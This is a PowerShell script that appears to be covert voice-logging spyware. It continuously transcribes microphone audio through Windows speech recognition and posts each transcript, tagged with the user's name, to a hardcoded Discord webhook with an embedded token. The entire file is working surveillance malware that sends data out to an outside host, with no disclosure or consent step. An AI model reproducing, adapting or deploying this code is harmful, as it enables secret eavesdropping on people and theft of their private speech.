function DC-Upload {

	[CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$False)]
		[string]$text 
	)

	 $dc = 'https://discord.com/api/webhooks/1292886305826406410/mzhsrrXC1zYVO4MN-8CDaHcksf2MUg0Ib5X35Gt472A6m0dvhCrSKSd-Cbh18HjH10kH'

	$Body = @{
	  'username' = $env:username
	  'content' = $text
	}

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
}



function voiceLogger {

    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:tmp/VoiceLog.txt"
            echo $results > $log
            $text = get-content $log -raw
            DC-Upload $text

            # Use a switch statement with the $results variable
            switch -regex ($results) {
                '\bnote\b' {saps notepad}
                '\bexit\b' {break}
            }
        }
    }
    Clear-Content -Path $log
}

voiceLogger
